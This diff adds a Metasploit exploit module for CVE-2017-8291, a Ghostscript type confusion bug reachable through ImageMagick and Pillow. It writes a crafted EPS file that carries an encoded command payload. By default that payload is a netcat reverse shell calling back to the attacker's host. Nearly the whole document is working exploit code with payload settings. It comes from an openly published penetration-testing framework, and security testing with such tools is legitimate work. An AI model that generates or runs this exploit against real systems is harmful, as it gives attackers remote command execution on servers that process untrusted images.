@@ -1,0 +1,75 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Ghostscript Type Confusion Arbitrary Command Execution',
+      'Description'     => %q{
+        This module exploits a type confusion vulnerability in Ghostscript that can
+        be exploited to obtain arbitrary command execution. This vulnerability affects
+        Ghostscript version 9.21 and earlier and can be exploited through libraries
+        such as ImageMagick and Pillow.
+      },
+      'Author'          => [
+        'Atlassian Security Team', # Vulnerability discovery
+        'hdm'                      # Metasploit module
+      ],
+      'References'      => [
+        %w{CVE 2017-8291},
+        %w{URL https://bugs.ghostscript.com/show_bug.cgi?id=697808},
+        %w{URL http://seclists.org/oss-sec/2017/q2/148},
+        %w{URL https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=04b37bbce174eed24edec7ad5b920eb93db4d47d},
+        %w{URL https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=4f83478c88c2e05d6e8d79ca4557eb039354d2f3}
+      ],
+      'DisclosureDate'  => 'Apr 27 2017',
+      'License'         => MSF_LICENSE,
+      'Platform'        => 'unix',
+      'Arch'            => ARCH_CMD,
+      'Privileged'      => false,
+      'Payload'         => {
+        'BadChars'      => "\x22\x27\x5c)(", # ", ', \, (, and )
+        'Compat'        => {
+          'PayloadType' => 'cmd cmd_bash',
+          'RequiredCmd' => 'generic netcat bash-tcp'
+        }
+      },
+      'Targets'         => [
+        ['EPS file',  template: 'msf.eps']
+      ],
+      'DefaultTarget'   => 0,
+      'DefaultOptions'  => {
+        'PAYLOAD'               => 'cmd/unix/reverse_netcat',
+        'LHOST'                 => Rex::Socket.source_address,
+        'DisablePayloadHandler' => false,
+        'WfsDelay'              => 9001
+      }
+    ))
+
+    register_options([
+      OptString.new('FILENAME', [true, 'Output file', 'msf.eps'])
+    ])
+  end
+
+  # Example usage from the bug tracker:
+  # $ gs -q -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f exploit2.eps
+
+  def exploit
+    file_create(template.sub('echo vulnerable > /dev/tty', payload.encoded))
+  end
+
+  def template
+    ::File.read(File.join(
+      Msf::Config.data_directory, 'exploits', 'CVE-2017-8291',
+      target[:template]
+    ))
+  end
+
+end
